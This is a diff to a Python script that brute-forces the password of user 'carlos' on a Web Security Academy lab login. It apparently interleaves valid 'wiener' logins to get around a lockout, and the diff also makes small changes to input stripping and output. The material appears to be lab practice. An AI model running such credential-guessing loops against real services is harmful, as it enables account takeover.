@@ -22,7 +22,7 @@ app = typer.Typer()
 
 @app.command()
 def run():
-    lab_id= '0a6900ae040fa12c807849bf00d900be'
+    lab_id= '0a9d0034036c77c68533a13b009a0034'
     
     victim_username = 'carlos'
     valid_username = 'wiener'
@@ -44,6 +44,7 @@ def run():
             task = progress.add_task(f"Password fuzzing for {victim_username} ...", total=file_length) 
             for password in file_lines:
                 #print(username)
+                password=password.strip()
         
                 
                 if not password:
@@ -55,8 +56,8 @@ def run():
                 # `host`, `User-Agent`, and `Referer`.
                 response = requests.post(
                                         f"https://{lab_id}.web-security-academy.net/login", data= {
-                                            "username" : victim_username.strip(),
-                                            "password": password.strip()
+                                            "username" : victim_username,
+                                            "password": password
                                         }, headers={
                                             "host": f"{lab_id}.web-security-academy.net",
                                             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
@@ -66,7 +67,8 @@ def run():
                 response_text = response.text
             # print(response.text)
                 if logged_in_string in response_text:
-                    console.print(f'\n Leaked credentials {victim_username}:{password.strip()}', style="info")
+                    console.print(f'\nLeaked credentials', style='warning')
+                    console.print(f'{victim_username}:{password}', style="danger")
                     progress.update(task, advance=file_length)
                     break
                     #user_found=True
@@ -85,8 +87,8 @@ def run():
                    # attempt with valid credentials.
                     response = requests.post(
                                         f"https://{lab_id}.web-security-academy.net/login", data= {
-                                            "username" : valid_username.strip(),
-                                            "password": valid_pass.strip()
+                                            "username" : valid_username,
+                                            "password": valid_pass
                                         }, headers={
                                             "host": f"{lab_id}.web-security-academy.net",
                                             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
